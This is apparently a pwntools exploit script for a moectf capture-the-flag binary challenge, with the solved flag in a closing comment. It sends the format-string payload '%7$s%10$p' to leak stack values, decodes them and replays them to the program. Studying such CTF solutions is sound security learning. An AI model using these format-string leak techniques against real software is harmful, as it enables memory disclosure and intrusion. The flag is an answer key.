from pwn import *
from struct import pack

filename = "./pwn"
libc = "./libc.so.6"


context(log_level="debug", os="linux", arch="i386")
context.terminal = ["tmux", "splitw", "-h"]


def VIO_TEXT(x):
    return f"\x1b[95m{x}\x1b[0m"


# io = gdb.debug(
#     "./pwn",gdbscript=""""
#     """)
io = process(filename)
# gdb.attach(
#     io,
#     gdbscript='''b *puts'''
# )
libc = ELF(libc)
elf = ELF(filename)
# io = remote("localhost", 40167)


def se(data):
    return io.send(data)


def sa(delim, data):
    return io.sendafter(delim, data)


def sl(data):
    return io.sendline(data)


def sla(delim, data):
    return io.sendlineafter(delim, data)


def rc(num):
    return io.recv(num)


def rl():
    return io.recvline()


def ru(delims):
    return io.recvuntil(delims)


def ia():
    return io.interactive()


def fine():
    return io.interactive()


payload = b"%7$s%10$p"
# payload = b"%10$p"
sla(b"name?\n", payload)
# s2 = int(io.recvuntil(b"I buried", drop=True).split(b",")[-1], 16)
# log.success(VIO_TEXT(f"first number: {hex(s2)}"))
ru(b"you,")

s = io.recv()
s1 = s[:5].decode()
log.success(VIO_TEXT(f"first number: {s1}"))

s2 = s[s.find(b"0x"):].split()[0]  # 切分

s2 = int(s2, 16)
s2 = pack("<Q", s2).rstrip(b"\x00").decode(errors="ignore")  # 小端序解析
log.success(VIO_TEXT(f"second number: {s2}"))

sl(s2)
io.recv()

sl(s1)

fine()

# moectf{THe-b3G1nNlng_OF_f0rm@T5cc02f05c}

